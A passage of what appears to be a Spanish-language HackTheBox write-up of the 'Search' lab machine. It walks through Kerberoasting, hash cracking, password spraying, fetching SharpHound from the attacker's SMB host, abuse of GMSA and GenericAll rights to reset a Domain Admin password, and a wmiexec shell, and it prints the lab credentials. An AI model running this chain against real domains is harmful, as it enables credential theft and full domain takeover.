contra otros servicios disponibles sin \u00e9xito por lo que se ejecut\u00f3 el script <code>impacket-GetUserSPNs</code> para buscar cuentas cuentas de servicio asociadas, obteniendo as\u00ed el hash de la cuenta <code>web_svc</code>.</p> <pre><code>\u2514\u2500$ impacket-GetUserSPNs 'search.htb/Hope.Sharp:IsolationIsKey?' -dc-ip 10.10.11.129 -request\nImpacket v0.9.24 - Copyright 2021 SecureAuth Corporation\n\nServicePrincipalName               Name     MemberOf  PasswordLastSet             LastLogon  Delegation\n---------------------------------  -------  --------  --------------------------  ---------  ----------\nRESEARCH/web_svc.search.htb:60001  web_svc            2020-04-09 08:59:11.329031  &lt;never&gt;\n\n$krb5tgs$23$*web_svc$SEARCH.HTB$search.htb/web_svc*$e4e91c0ded69711c5e46663a3d941033$bc25caca76a25319cd9f4f512b04e8ef8f295a34ffa3190c480d8f19bfd256f33b7a875a28c0fade7eec04932cb51d809cab487208a8ad0a062d68a53bc7dd86f0a5504d4e3b8cfe15360868d812e057835654ed3a6e2e5c7af2b2a2e15d93266b7502f36b1872bdd65f798696bb7c3caf1cbebd6bd9b3e425a66cd7c55e56841cc8c7fbbfca30d1b6f97cc62997d979e2b65d3289ca9e84d6af847e3280561e246cedceb3e876080f30b98a799c0ce0c962387bd0c849353efbb16d795609cb4a5da2f63b19be19cb4d44b5e1b2f1dd1a86375851d15c8144f83dc611541131ab82081306cb4e5894e327f28ec9d69fae104e95db6da18cc21f2375ec811a99e21de24ea6aeb1eb3c82e456ac52e561c93161f2b991f4b4d3ee0855df4efa4dfb72bda2834fe378cf61d3f2aba87f8fbfcc9bb4e96577cf7959ab396de7c70a97d3f979f4f4768e76b19ed7d7877407c4981bc10c5c0ad458d070f7840b4ff59c8433451dbf8a4141b732ef4415d694fbe1108f32d9e0b67256ba791a5c96591b151cabe4d1918f0e19bb3e5682c62104d82354eae828d72b08dca8f82856cc9d99ee4b98ab619be0b1863de1efd1711f9dee6a7b4bc25082ce1bf05b55e2e17110e802164b32d18e7dd3a3a4991ff802ddb0643c14a8bcb9d481d14c97018c4c771cf08f7b0ea0e1646604a99a29dcae4a3b31f75df53146c27c3a5ef4fdaa1b4bf9fa25f1e212e0ff3384fd90c611c5da3dfd006f49ccc2d5ac3fdad439a4f7136e4f48812ff1c76b99de5b5697361604ac9a252c23eb723a25d23542d995d2c38e44f7b0aa29f489dc6ded4615596b1a2ceb79973a8a5972d0d67235c43c25b9d4eeee0dedba4ce0946f58ca33dc80c35e1b09139bd52a6a66219761e734a261f7ed4d2078bb6eaba7d463ebfe392c814b58623d16903d0e3e6ef3e14dd52e37dbe461dbc4d6db13d75bd9022de0855052efdb50d7f0fa599e83188c2cd3d2ce452854f9231ecf8f733f79c46ab3196707ae4b792ccd12688866444f26db4554a25ed89d4f69864adb9bcc9ca167d1fabd2da127dd4e09e1928025f0457218097658f61f834cacd6b6b9a9ba8809eafdd1a39860f8926c29b5a3658e88ee55cd2ee915f1128eab3f6d14e58e39eb934759abc0075c331e141dcf36944bae4b823f531ebeefd62d1bc12fa7c79006030efb023a9ed8704833d6eb8223f00d75430309046d2ba7e8d0ebbe5d35661a6e0ad96709d3c0aa0bf1ca85c0ea91c153c70cd83a79302637b02a0e36eebf8b565d5ce1c53546d75ac2471b0d6784e5e59cbbaed80d0441493cd67e8e554259671ef2f3a46b61681eb2c92f7b10846901d6cf7391e92409d3b000eee04ed6d2cbe200f7c2ce0297cd044fbfa60f050d73d4eaa055a740eeb6a109a0e912c0d8f28832ad198200ad195e71a5218a652717ba4a76a06e73037fa60e8a31c11e6a49d931f427\n</code></pre> <p>Una vez obtenido el hash se hizo uso de <code>hashcat</code> para intentar crackear el hash obtenido, obteniendo como resultado la contrase\u00f1a <code>@3ONEmillionbaby</code>.</p> <pre><code>.\\hashcat -m 13100 .\\hope_sharp.hash .\\rockyou.txt\n# Data truncada\n@3ONEmillionbaby\n</code></pre> <p>Se encontr\u00f3 que las credenciales eran v\u00e1lidas para el servicio <code>smb</code>. Al no tener escritura en ning\u00fan directorio, se pudieron identificar otros usuarios existentes dentro del directorio <code>RedirectedFolders$</code>.</p> <pre><code>\u2514\u2500$ smbclient \\\\\\\\10.10.11.129\\\\RedirectedFolders$ -U 'web_svc'\nPassword for [WORKGROUP\\web_svc]:\nTry \"help\" to get a list of possible commands.\nsmb: \\&gt; dir\n  .                                  Dc        0  Wed May  3 23:40:56 2023\n  ..                                 Dc        0  Wed May  3 23:40:56 2023\n  abril.suarez                       Dc        0  Tue Apr  7 14:12:58 2020\n  Angie.Duffy                        Dc        0  Fri Jul 31 09:11:32 2020\n  Antony.Russo                       Dc        0  Fri Jul 31 08:35:32 2020\n  belen.compton                      Dc        0  Tue Apr  7 14:32:31 2020\n  Cameron.Melendez                   Dc        0  Fri Jul 31 08:37:36 2020\n  chanel.bell                        Dc        0  Tue Apr  7 14:15:09 2020\n  Claudia.Pugh                       Dc        0  Fri Jul 31 09:09:08 2020\n  Cortez.Hickman                     Dc        0  Fri Jul 31 08:02:04 2020\n  dax.santiago                       Dc        0  Tue Apr  7 14:20:08 2020\n  Eddie.Stevens                      Dc        0  Fri Jul 31 07:55:34 2020\n  edgar.jacobs                       Dc        0  Thu Apr  9 16:04:11 2020\n  Edith.Walls                        Dc        0  Fri Jul 31 08:39:50 2020\n  eve.galvan                         Dc        0  Tue Apr  7 14:23:13 2020\n  frederick.cuevas                   Dc        0  Tue Apr  7 14:29:22 2020\n  hope.sharp                         Dc        0  Thu Apr  9 10:34:41 2020\n  jayla.roberts                      Dc        0  Tue Apr  7 14:07:00 2020\n  Jordan.Gregory                     Dc        0  Fri Jul 31 09:01:06 2020\n  payton.harmon                      Dc        0  Thu Apr  9 16:11:39 2020\n  Reginald.Morton                    Dc        0  Fri Jul 31 07:44:32 2020\n  santino.benjamin                   Dc        0  Tue Apr  7 14:10:25 2020\n  Savanah.Velazquez                  Dc        0  Fri Jul 31 08:21:42 2020\n  sierra.frye                        Dc        0  Wed Nov 17 20:01:46 2021\n  trace.ryan                         Dc        0  Thu Apr  9 16:14:26 2020\n\n                3246079 blocks of size 4096. 530782 blocks available\n</code></pre>","tags":["Information Leakage - Password in picture","RPC Enumeration (rpcclient)","Ldap Enumeration (ldapdomaindump)","Bloodhound Enumeration","Kerberoasting Attack (GetUserSPNs.py)","SMB Password Spray Attack (Crackmapexec)","Unprotecting password-protected Excel (Remove Protection)","Playing with pfx certificates","Gaining access to Windows PowerShell Web Access","Abusing ReadGMSAPassword privilege","Abusing GenericAll privilege (Resetting a user's password)","Gaining access with wmiexec"]},{"location":"HackTheBox/Boxes/Windows/3%20Dif%C3%ADcil/Search/#password-spraying","title":"Password Spraying","text":"","tags":["Information Leakage - Password in picture","RPC Enumeration (rpcclient)","Ldap Enumeration (ldapdomaindump)","Bloodhound Enumeration","Kerberoasting Attack (GetUserSPNs.py)","SMB Password Spray Attack (Crackmapexec)","Unprotecting password-protected Excel (Remove Protection)","Playing with pfx certificates","Gaining access to Windows PowerShell Web Access","Abusing ReadGMSAPassword privilege","Abusing GenericAll privilege (Resetting a user's password)","Gaining access with wmiexec"]},{"location":"HackTheBox/Boxes/Windows/3%20Dif%C3%ADcil/Search/#web_svc-edgarjacobs","title":"web_svc \u2192 edgar.jacobs","text":"<p>Posteriormente se hizo uso de <code>crackmapexec</code> para hacer password spraying con las cuentas y contrase\u00f1as obtenidas. Identificando la credenciales <code>edgar.jacobs:@3ONEmillionbaby</code> como v\u00e1lidas.</p> <pre><code>\u2514\u2500$ crackmapexec ldap 10.10.11.129 -u content/valid_users_2.txt -p content/pass.txt --continue-on-success\nSMB         10.10.11.129    445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)\nSMB         10.10.11.129    445    RESEARCH         [-] search.htb\\abril.suarez:IsolationIsKey?\nSMB         10.10.11.129    445    RESEARCH         [-] search.htb\\abril.suarez:@3ONEmillionbaby\nSMB         10.10.11.129    445    RESEARCH         [-] search.htb\\Angie.Duffy:IsolationIsKey?\nSMB         10.10.11.129    445    RESEARCH         [-] search.htb\\Angie.Duffy:@3ONEmillionbaby\nSMB         10.10.11.129    445    RESEARCH         [-] search.htb\\Antony.Russo:IsolationIsKey?\nSMB         10.10.11.129    445    RESEARCH         [-] search.htb\\Antony.Russo:@3ONEmillionbaby\nSMB         10.10.11.129    445    RESEARCH         [-] search.htb\\belen.compton:IsolationIsKey?\nSMB         10.10.11.129    445    RESEARCH         [-] search.htb\\belen.compton:@3ONEmillionbaby\nSMB         10.10.11.129    445    RESEARCH         [-] search.htb\\Cameron.Melendez:IsolationIsKey?\nSMB         10.10.11.129    445    RESEARCH         [-] search.htb\\Cameron.Melendez:@3ONEmillionbaby\nSMB         10.10.11.129    445    RESEARCH         [-] search.htb\\chanel.bell:IsolationIsKey?\nSMB         10.10.11.129    445    RESEARCH         [-] search.htb\\chanel.bell:@3ONEmillionbaby\nSMB         10.10.11.129    445    RESEARCH         [-] search.htb\\Claudia.Pugh:IsolationIsKey?\nSMB         10.10.11.129    445    RESEARCH         [-] search.htb\\Claudia.Pugh:@3ONEmillionbaby\nSMB         10.10.11.129    445    RESEARCH         [-] search.htb\\Cortez.Hickman:IsolationIsKey?\nSMB         10.10.11.129    445    RESEARCH         [-] search.htb\\Cortez.Hickman:@3ONEmillionbaby\nSMB         10.10.11.129    445    RESEARCH         [-] search.htb\\dax.santiago:IsolationIsKey?\nSMB         10.10.11.129    445    RESEARCH         [-] search.htb\\dax.santiago:@3ONEmillionbaby\nSMB         10.10.11.129    445    RESEARCH         [-] search.htb\\Eddie.Stevens:IsolationIsKey?\nSMB         10.10.11.129    445    RESEARCH         [-] search.htb\\Eddie.Stevens:@3ONEmillionbaby\nSMB         10.10.11.129    445    RESEARCH         [-] search.htb\\edgar.jacobs:IsolationIsKey?\nLDAP        10.10.11.129    389    RESEARCH         [+] search.htb\\edgar.jacobs:@3ONEmillionbaby\nLDAP        10.10.11.129    389    RESEARCH         [-] search.htb\\Edith.Walls:IsolationIsKey?\nLDAP        10.10.11.129    389    RESEARCH         [-] search.htb\\Edith.Walls:@3ONEmillionbaby\nLDAP        10.10.11.129    389    RESEARCH         [-] search.htb\\eve.galvan:IsolationIsKey?\nLDAP        10.10.11.129    389    RESEARCH         [-] search.htb\\eve.galvan:@3ONEmillionbaby\nLDAP        10.10.11.129    389    RESEARCH         [-] search.htb\\frederick.cuevas:IsolationIsKey?\nLDAP        10.10.11.129    389    RESEARCH         [-] search.htb\\frederick.cuevas:@3ONEmillionbaby\nLDAP        10.10.11.129    389    RESEARCH         [+] search.htb\\hope.sharp:IsolationIsKey?\nLDAP        10.10.11.129    389    RESEARCH         [-] search.htb\\hope.sharp:@3ONEmillionbaby\nLDAP        10.10.11.129    389    RESEARCH         [-] search.htb\\jayla.roberts:IsolationIsKey?\nLDAP        10.10.11.129    389    RESEARCH         [-] search.htb\\jayla.roberts:@3ONEmillionbaby\nLDAP        10.10.11.129    389    RESEARCH         [-] search.htb\\Jordan.Gregory:IsolationIsKey?\nLDAP        10.10.11.129    389    RESEARCH         [-] search.htb\\Jordan.Gregory:@3ONEmillionbaby\nLDAP        10.10.11.129    389    RESEARCH         [-] search.htb\\payton.harmon:IsolationIsKey?\nLDAP        10.10.11.129    389    RESEARCH         [-] search.htb\\payton.harmon:@3ONEmillionbaby\nLDAP        10.10.11.129    389    RESEARCH         [-] search.htb\\Reginald.Morton:IsolationIsKey?\nLDAP        10.10.11.129    389    RESEARCH         [-] search.htb\\Reginald.Morton:@3ONEmillionbaby\nLDAP        10.10.11.129    389    RESEARCH         [-] search.htb\\santino.benjamin:IsolationIsKey?\nLDAP        10.10.11.129    389    RESEARCH         [-] search.htb\\santino.benjamin:@3ONEmillionbaby\nLDAP        10.10.11.129    389    RESEARCH         [-] search.htb\\Savanah.Velazquez:IsolationIsKey?\nLDAP        10.10.11.129    389    RESEARCH         [-] search.htb\\Savanah.Velazquez:@3ONEmillionbaby\nLDAP        10.10.11.129    389    RESEARCH         [-] search.htb\\sierra.frye:IsolationIsKey?\nLDAP        10.10.11.129    389    RESEARCH         [-] search.htb\\sierra.frye:@3ONEmillionbaby\nLDAP        10.10.11.129    389    RESEARCH         [-] search.htb\\trace.ryan:IsolationIsKey?\nLDAP        10.10.11.129    389    RESEARCH         [-] search.htb\\trace.ryan:@3ONEmillionbaby\n</code></pre> <p>Una vez obtenido el acceso se pudo ingresar al folder correspondiente del usuario, encontrando el archivo <code>Phishing_Attempt.xlsx</code> dentro de la carpeta de escritorio.</p> <pre><code>\u2514\u2500$ smbclient \\\\\\\\10.10.11.129\\\\RedirectedFolders$ -U 'edgar.jacobs'\nPassword for [WORKGROUP\\edgar.jacobs]:\nTry \"help\" to get a list of possible commands.\nsmb: \\&gt; cd edgar.jacobs\\\nsmb: \\edgar.jacobs\\&gt; dir\n  .                                  Dc        0  Thu Apr  9 16:04:11 2020\n  ..                                 Dc        0  Thu Apr  9 16:04:11 2020\n  Desktop                           DRc        0  Mon Aug 10 06:02:16 2020\n  Documents                         DRc        0  Mon Aug 10 06:02:17 2020\n  Downloads                         DRc        0  Mon Aug 10 06:02:17 2020\n\n                3246079 blocks of size 4096. 525988 blocks available\nsmb: \\edgar.jacobs\\&gt; cd desktop\nsmb: \\edgar.jacobs\\desktop\\&gt; dir\n  .                                 DRc        0  Mon Aug 10 06:02:16 2020\n  ..                                DRc        0  Mon Aug 10 06:02:16 2020\n  $RECYCLE.BIN                     DHSc        0  Thu Apr  9 16:05:29 2020\n  desktop.ini                      AHSc      282  Mon Aug 10 06:02:16 2020\n  Microsoft Edge.lnk                 Ac     1450  Thu Apr  9 16:05:03 2020\n  Phishing_Attempt.xlsx              Ac    23130  Mon Aug 10 06:35:44 2020\n\n                3246079 blocks of size 4096. 525913 blocks available\n</code></pre>","tags":["Information Leakage - Password in picture","RPC Enumeration (rpcclient)","Ldap Enumeration (ldapdomaindump)","Bloodhound Enumeration","Kerberoasting Attack (GetUserSPNs.py)","SMB Password Spray Attack (Crackmapexec)","Unprotecting password-protected Excel (Remove Protection)","Playing with pfx certificates","Gaining access to Windows PowerShell Web Access","Abusing ReadGMSAPassword privilege","Abusing GenericAll privilege (Resetting a user's password)","Gaining access with wmiexec"]},{"location":"HackTheBox/Boxes/Windows/3%20Dif%C3%ADcil/Search/#edgarjacobs-sierrafrye","title":"edgar.jacobs \u2192 sierra.frye","text":"<p>Despu\u00e9s de descargar el archivo y descromprimirlo se intent\u00f3 buscar informaci\u00f3n relevante dentro de los archivos correspondientes.</p> <pre><code>\u2514\u2500$ cp Phishing_Attempt.xlsx Phishing_Attempt.zip\n\n\u2514\u2500$ unzip Phishing_Attempt.zip\nArchive:  Phishing_Attempt.zip\n  inflating: [Content_Types].xml\n  inflating: _rels/.rels\n  inflating: xl/workbook.xml\n  inflating: xl/_rels/workbook.xml.rels\n  inflating: xl/worksheets/sheet1.xml\n  inflating: xl/worksheets/sheet2.xml\n  inflating: xl/theme/theme1.xml\n  inflating: xl/styles.xml\n  inflating: xl/sharedStrings.xml\n  inflating: xl/drawings/drawing1.xml\n  inflating: xl/charts/chart1.xml\n  inflating: xl/charts/style1.xml\n  inflating: xl/charts/colors1.xml\n  inflating: xl/worksheets/_rels/sheet1.xml.rels\n  inflating: xl/worksheets/_rels/sheet2.xml.rels\n  inflating: xl/drawings/_rels/drawing1.xml.rels\n  inflating: xl/charts/_rels/chart1.xml.rels\n  inflating: xl/printerSettings/printerSettings1.bin\n  inflating: xl/printerSettings/printerSettings2.bin\n  inflating: xl/calcChain.xml\n  inflating: docProps/core.xml\n  inflating: docProps/app.xml\n</code></pre> <p>Encontrando en la ruta <code>xl/worksheets/sheet2.xml</code>, la cual desde la interfaz de usuario se encuentra protegida y no se permite ver la columna <code>C</code> de la segunda p\u00e1gina, otros nombres de usuario y contrase\u00f1as que se pudieran usar para estos nuevos o los existentes.</p> <pre><code># Usuarios:\n\nBobby.Wolf\nMargaret.Robinson\nScarlett.Parks\nEliezer.Jordan\nHunter.Kirby\nAnnabelle.Wells\nJeramiah.Fritz\nAbby.Gonzalez\nJoy.Costa\nVincent.Sutton\n\n# Contrase\u00f1as:\n\n//51+mountain+DEAR+noise+83//\n++47|building|WARSAW|gave|60++\n!!05_goes_SEVEN_offer_83!!\n~~27%when%VILLAGE%full%00~~\n==95~pass~QUIET~austria~77==\n//61!banker!FANCY!measure!25//\n??40:student:MAYOR:been:66??\n&amp;amp;&amp;amp;75:major:RADIO:state:93&amp;amp;&amp;amp;\n**30*venus*BALL*office*42**\n;;36!cried!INDIA!year!50;;\n..10-time-TALK-proud-66..\n??47^before^WORLD^surprise^91??\n**24&amp;amp;moment&amp;amp;BRAZIL&amp;amp;members&amp;amp;66**\n$$49=wide=STRAIGHT=jordan=28$$18\n</code></pre> <p>Por lo que nuevamente se realiz\u00f3 un password spraying del compendio de usuarios agregando las nuevas contrase\u00f1as identificadas. Encontrando las credenciales <code>sierra.frye:$$49=wide=STRAIGHT=jordan=28$$18</code> como v\u00e1lidas.</p> <pre><code>\u2514\u2500$ crackmapexec ldap 10.10.11.129 -u valid_users_2.txt -p pass_2.txt --continue-on-success\nSMB         10.10.11.129    445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)\n# Data truncada\nLDAP        10.10.11.129    389    RESEARCH         [+] search.htb\\sierra.frye:$$49=wide=STRAIGHT=jordan=28$$18\n</code></pre> <p>Dentro de la carpeta del usuario en el servicio de <code>smb</code>, se identificaron los archivos <code>search-RESEARCH-CA.p12</code> y <code>staff.pfx</code>.</p> <pre><code>\u2514\u2500$ smbclient \\\\\\\\10.10.11.129\\\\RedirectedFolders$ -U 'sierra.frye'\nPassword for [WORKGROUP\\sierra.frye]:\nTry \"help\" to get a list of possible commands.\nsmb: \\&gt; cd sierra.frye\\\n...\nsmb: \\sierra.frye\\downloads\\backups\\&gt; dir\n  .                                 DHc        0  Mon Aug 10 16:39:17 2020\n  ..                                DHc        0  Mon Aug 10 16:39:17 2020\n  search-RESEARCH-CA.p12             Ac     2643  Fri Jul 31 11:04:11 2020\n  staff.pfx                          Ac     4326  Mon Aug 10 16:39:17 2020\n\n                3246079 blocks of size 4096. 533816 blocks available\n</code></pre> <p>Despu\u00e9s de indagar acerca de su uso, se encontr\u00f3 que es posible crackear el <code>.pfx</code> por lo que haciendo uso de <code>pfx2john</code> se extrajo/gener\u00f3 el hash correspondiente para posteriormente hacer uso de <code>john</code> para crackearlo. Encontrando as\u00ed la passphrase <code>misspissy</code>.</p> <pre><code>\u2514\u2500$ pfx2john staff.pfx &gt; staff_pfx_hash\n\n\u2514\u2500$ catn staff_pfx_hash\nstaff.pfx:$pfxng$1$20$2000$20$ab06d852d1875d818341c5737782c7117277265e$308210873082062006092a864886f70d010701a08206110482060d3082060930820605060b2a864886f70d010c0a0102a08204fe308204fa301c060a2a864886f70d010c0103300e0408cc8cfc26a5...\n\n\u2514\u2500$ john --wordlist=/usr/share/wordlists/rockyou.txt staff_pfx_hash\nUsing default input encoding: UTF-8\nLoaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 256/256 AVX2 8x])\nCost 1 (iteration count) is 2000 for all loaded hashes\nCost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes\nWill run 4 OpenMP threads\nPress 'q' or Ctrl-C to abort, almost any other key for status\nmisspissy        (staff.pfx)\n1g 0:00:00:44 DONE (2023-05-04 00:33) 0.02269g/s 124478p/s 124478c/s 124478C/s misssnamy..missnono\nUse the \"--show\" option to display all of the cracked passwords reliably\nSession completed.\n</code></pre> <p>Al no contar espec\u00edficamente con un escenario planteado en el uso del <code>.p12</code> como lo es indicado aqu\u00ed se busc\u00f3 importar el certificado en el navegador para saber si de alguna forma estaba sirviendo como forma de autenticaci\u00f3n contra las rutas encontradas a las cuales no se ten\u00eda acceso v\u00eda web (<code>staff</code> y <code>certsrv</code>). Importando desde opciones de firefox en la secci\u00f3n de \"Certificate Manager\", en donde se pedir\u00e1 la passphrase antes encontrada.</p> <p></p> <p>Posteriormente accediendo desde el subdominio <code>https://research.search.htb/staff/</code> se puede visualizar un login de powershell desde la web, en donde al proveer las credenciales encontradas se obtiene acceso a la m\u00e1quina.</p> <p></p>","tags":["Information Leakage - Password in picture","RPC Enumeration (rpcclient)","Ldap Enumeration (ldapdomaindump)","Bloodhound Enumeration","Kerberoasting Attack (GetUserSPNs.py)","SMB Password Spray Attack (Crackmapexec)","Unprotecting password-protected Excel (Remove Protection)","Playing with pfx certificates","Gaining access to Windows PowerShell Web Access","Abusing ReadGMSAPassword privilege","Abusing GenericAll privilege (Resetting a user's password)","Gaining access with wmiexec"]},{"location":"HackTheBox/Boxes/Windows/3%20Dif%C3%ADcil/Search/#post-explotacion","title":"Post Explotaci\u00f3n","text":"","tags":["Information Leakage - Password in picture","RPC Enumeration (rpcclient)","Ldap Enumeration (ldapdomaindump)","Bloodhound Enumeration","Kerberoasting Attack (GetUserSPNs.py)","SMB Password Spray Attack (Crackmapexec)","Unprotecting password-protected Excel (Remove Protection)","Playing with pfx certificates","Gaining access to Windows PowerShell Web Access","Abusing ReadGMSAPassword privilege","Abusing GenericAll privilege (Resetting a user's password)","Gaining access with wmiexec"]},{"location":"HackTheBox/Boxes/Windows/3%20Dif%C3%ADcil/Search/#enumeracion_1","title":"Enumeraci\u00f3n","text":"<p>Al tratarse de una m\u00e1quina unida a dominio se recopil\u00f3 informaci\u00f3n haciendo uso de SharpHound para una vez obtenida, analizarla con BloodHound. Por lo que se subi\u00f3 el archivo <code>SharpHound.exe</code> y se ejecut\u00f3 sin par\u00e1metros para recopilar el <code>.zip</code> con la informaci\u00f3n del dominio.</p> <pre><code>PS C:\\Users\\Sierra.Frye\\Documents&gt; \n\ncp \\\\10.10.16.4\\smbFolder\\SharpHound.exe .\n\nPS C:\\Users\\Sierra.Frye\\Documents&gt; \n\n.\\SharpHound.exe\n\n2023-05-09T13:45:04.2992791+01:00|INFORMATION|This version of SharpHound is compatible with the 4.2 Release of BloodHound\n2023-05-09T13:45:04.7524092+01:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote\n2023-05-09T13:45:04.7836667+01:00|INFORMATION|Initializing SharpHound at 13:45 on 09/05/2023\n2023-05-09T13:45:17.7604712+01:00|INFORMATION|Flags: Group, LocalAdmin, Session, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote\n2023-05-09T13:45:17.9323511+01:00|INFORMATION|Beginning LDAP search for search.htb\n2023-05-09T13:45:18.0417048+01:00|INFORMATION|Producer has finished, closing LDAP channel\n2023-05-09T13:45:18.0573303+01:00|INFORMATION|LDAP channel closed, waiting for consumers\n2023-05-09T13:45:48.3532054+01:00|INFORMATION|Status: 0 objects finished (+0 0)/s -- Using 33 MB RAM\n2023-05-09T13:46:13.6037415+01:00|INFORMATION|Consumers finished, closing output channel\nClosing writers\n2023-05-09T13:46:13.6193716+01:00|INFORMATION|Output channel closed, waiting for output task to complete\n2023-05-09T13:46:13.7131142+01:00|INFORMATION|Status: 345 objects finished (+345 6.272727)/s -- Using 41 MB RAM\n2023-05-09T13:46:13.7131142+01:00|INFORMATION|Enumeration finished in 00:00:55.7851484\n2023-05-09T13:46:13.8068698+01:00|INFORMATION|Saving cache with stats: 305 ID to type mappings.\n 309 name to SID mappings.\n 0 machine sid mappings.\n 2 sid to domain mappings.\n 0 global catalog mappings.\n2023-05-09T13:46:13.8224917+01:00|INFORMATION|SharpHound Enumeration Completed at 13:46 on 09/05/2023! Happy Graphing!\n\nPS C:\\Users\\Sierra.Frye\\Documents&gt; \n\nls -force\n\n    Directory: C:\\Users\\Sierra.Frye\\Documents\n\nMode                LastWriteTime         Length Name\n\n----                -------------         ------ ----                                                                  \n\nd--hsl         4/7/2020  10:07 PM                My Music\nd--hsl         4/7/2020  10:07 PM                My Pictures\nd--hsl         4/7/2020  10:07 PM                My Videos\nd-----        7/31/2020   9:00 AM                WindowsPowerShell\n-a----         5/9/2023   1:46 PM          26410 20230509134613_BloodHound.zip\n-a----        4/18/2023   3:01 AM        1051648 SharpHound.exe\n-a----         5/9/2023   1:46 PM          48450 Y2IwYjcwMmYtN2IwMC00MGNjLWI1MTAtZWYzMDU1ZmVlMjRj.bin\n\nPS C:\\Users\\Sierra.Frye\\Documents&gt; \n</code></pre> <p>Al descargar y cargar el archivo <code>20230509134613_BloodHound.zip</code> a BloodHound, se busc\u00f3 identificar las cuentas a las que se contaba con acceso para marcarlas como \"Owned\".</p> <p></p> <p>Para despu\u00e9s dentro de la secci\u00f3n de an\u00e1lisis buscar el camino m\u00e1s r\u00e1pido de los Principals obtenidos hacia Domain Admin. Encontrando un camino potencial de <code>sierra.frya</code> a <code>tristan.davies</code> por medio del abuso del permiso <code>ReadGMSAPassword</code> que existe en el grupo <code>ITSEC</code> para <code>BIR-ADFS-GMSA$</code> y desde mismo hacia <code>tristan.davies</code> existe un permiso <code>GenericAll</code> disponible para abusar.</p> <p></p>","tags":["Information Leakage - Password in picture","RPC Enumeration (rpcclient)","Ldap Enumeration (ldapdomaindump)","Bloodhound Enumeration","Kerberoasting Attack (GetUserSPNs.py)","SMB Password Spray Attack (Crackmapexec)","Unprotecting password-protected Excel (Remove Protection)","Playing with pfx certificates","Gaining access to Windows PowerShell Web Access","Abusing ReadGMSAPassword privilege","Abusing GenericAll privilege (Resetting a user's password)","Gaining access with wmiexec"]},{"location":"HackTheBox/Boxes/Windows/3%20Dif%C3%ADcil/Search/#escalacion-de-privilegios","title":"Escalaci\u00f3n de privilegios","text":"","tags":["Information Leakage - Password in picture","RPC Enumeration (rpcclient)","Ldap Enumeration (ldapdomaindump)","Bloodhound Enumeration","Kerberoasting Attack (GetUserSPNs.py)","SMB Password Spray Attack (Crackmapexec)","Unprotecting password-protected Excel (Remove Protection)","Playing with pfx certificates","Gaining access to Windows PowerShell Web Access","Abusing ReadGMSAPassword privilege","Abusing GenericAll privilege (Resetting a user's password)","Gaining access with wmiexec"]},{"location":"HackTheBox/Boxes/Windows/3%20Dif%C3%ADcil/Search/#sierrafrya-tristandavies","title":"sierra.frya \u2192 tristan.davies","text":"<p>Inicialmente para abusar del permiso <code>ReadGMSAPassword</code> se encontr\u00f3 el siguiente fragmento de instrucciones en powershell para obtener un NT-Hash e intentar autenticarse con este, sin embargo no se logr\u00f3 de manera satisfactoria.</p> <pre><code># Save the blob to a variable\n$gmsa = Get-ADServiceAccount -Identity 'BIR-ADFS-GMSA$' -Properties 'msDS-ManagedPassword'\n$mp = $gmsa.'msDS-ManagedPassword'\n\n(ConvertFrom-ADManagedPasswordBlob $mp).SecureCurrentPassword | ConvertTo-NTHash\n</code></pre> <p>Por lo que en su lugar, se opt\u00f3 por ejecutar las siguientes instrucciones para concatenar el abuso de <code>ReadGMSAPassword</code> con el <code>GenericAll</code> de <code>BIR-ADFS-GMSA$</code> ya que con la lectura de la contrase\u00f1a GMSA se puede generar un objeto de tipo credencial y as\u00ed impersonar al usuario <code>tristan.davies</code> y ejecutar cualquier comando, por ejemplo, un reseteo de contrase\u00f1a del mismo.</p> <pre><code># Save the blob to a variable\n$gmsa = Get-ADServiceAccount -Identity 'BIR-ADFS-GMSA$' -Properties 'msDS-ManagedPassword'\n$mp = $gmsa.'msDS-ManagedPassword'\n\n$cred = new-object system.management.automation.PSCredential \"search.htb\\BIR-ADFS-GMSA$\",(ConvertFrom-ADManagedPasswordBlob $mp).SecureCurrentPassword\n\nInvoke-Command -computername 127.0.0.1 -ScriptBlock {Set-ADAccountPassword -Identity tristan.davies -reset -NewPassword (ConvertTo-SecureString -AsPlainText 'Password1234!' -force)} -Credential $cred \n</code></pre> <p>Y as\u00ed obtener acceso como Domain Admin en la m\u00e1quina por medio de <code>impacket-wmiexec</code>. Al momento de realizar la m\u00e1quina se intent\u00f3 acceder haciendo uso de <code>impacket-psexec</code> y <code>impacket-smbexec</code> pero no se tuvo \u00e9xito.</p> <pre><code>\u2514\u2500$ impacket-wmiexec 'search.htb/tristan.davies:Password1234!@10.10.11.129'\nImpacket v0.9.24 - Copyright 2021 SecureAuth Corporation\n\n[*] SMBv3.0 dialect used\n[!] Launching semi-interactive shell - Careful what you execute\n[!] Press help for extra shell commands\nC:\\&gt;whoami\nsearch\\tristan.davies\n\nC:\\users\\administrator\\desktop&gt;net user tristan.davies\nUser name                    Tristan.Davies\nFull Name                    Tristan Davies\nComment                      The only Domain Admin allowed, Administrator will soon be disabled\nUser's comment\nCountry/region code          000 (System Default)\nAccount active               Yes\nAccount expires              Never\n\nPassword last set            08/05/2023 15:43:39\nPassword expires             Never\nPassword changeable          09/05/2023 15:43:39\nPassword required            Yes\nUser may change password     Yes\n\nWorkstations allowed         All\nLogon script\nUser profile\nHome directory\nLast logon                   08/05/2023 15:35:43\n\nLogon hours allowed          All\n\nLocal Group Memberships      *Administrators\nGlobal Group memberships     *Domain Admins        *Domain Users\n                             *Enterprise Admins    *Group Policy Creator\n                             *Schema Admins\nThe command completed successfully.\n</code></pre>","tags":["Information Leakage - Password in picture","RPC Enumeration (rpcclient)","Ldap Enumeration (ldapdomaindump)","Bloodhound Enumeration","Kerberoasting Attack (GetUserSPNs.py)","SMB Password Spray Attack (Crackmapexec)","Unprotecting password-protected Excel (Remove Protection)","Playing with pfx certificates","Gaining access to Windows PowerShell Web Access","Abusing ReadGMSAPassword privilege","Abusing GenericAll privilege (Resetting a user's password)","Gaining access with 